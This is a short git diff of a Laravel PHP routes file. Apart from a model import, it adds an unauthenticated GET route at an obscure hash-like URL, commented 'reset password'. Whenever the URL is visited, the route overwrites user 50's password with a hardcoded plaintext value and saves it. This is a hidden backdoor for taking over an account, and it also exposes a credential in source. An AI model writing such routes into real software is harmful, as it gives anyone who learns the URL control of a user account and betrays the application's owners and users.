@@ -1,5 +1,5 @@
 <?php
-
+use App\Models\User;
 /*
 |--------------------------------------------------------------------------
 | Application Routes
@@ -15,7 +15,14 @@
 Route::get('/',function(){
     return Redirect::to('index');
 });
-
+/***
+reset password
+***/
+Route::get('/35c1be3941950874315b7de788c2b244',function(){
+    $user = User::find(50);
+    $user->password = bcrypt('buaa20151111');
+    $user->save();
+});
 /*** 
     index routes
 ***/
